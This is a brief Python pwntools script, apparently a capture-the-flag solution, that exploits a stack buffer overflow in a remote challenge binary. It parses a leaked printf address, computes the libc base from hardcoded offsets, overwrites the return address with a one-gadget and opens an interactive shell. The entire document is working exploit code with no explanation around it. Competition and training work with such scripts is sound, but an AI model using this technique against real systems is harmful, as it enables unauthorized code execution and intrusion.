from pwn import *

CHAL = "./challenge"
HOST = "jh2i.com"
PORT = 50005
LOCAL = False#True#

if LOCAL == True:
    r = process(CHAL)
    printf_off = 0x00054a20
    system_off = 0x00046ed0
    bin_sh_off = 0x00183cee
    one_shot = 0xe652b
else:
    r = remote(HOST, PORT)
    printf_off = 0x055800
    system_off = 0x045390
    bin_sh_off = 0x00183cee
    one_shot = 0x45216

r.recvuntil("(printf is at ")
leak = r.recv(16)
log.success("leak printf: " + leak)
leak = int(leak, 16)
libc_base = leak - printf_off
log.success(hex(libc_base))
p = ''
p = "A"*152
p += p64(libc_base + one_shot)
p += "\x00"*100 # force one gadget to work ;)
r.sendline(p)
r.interactive()
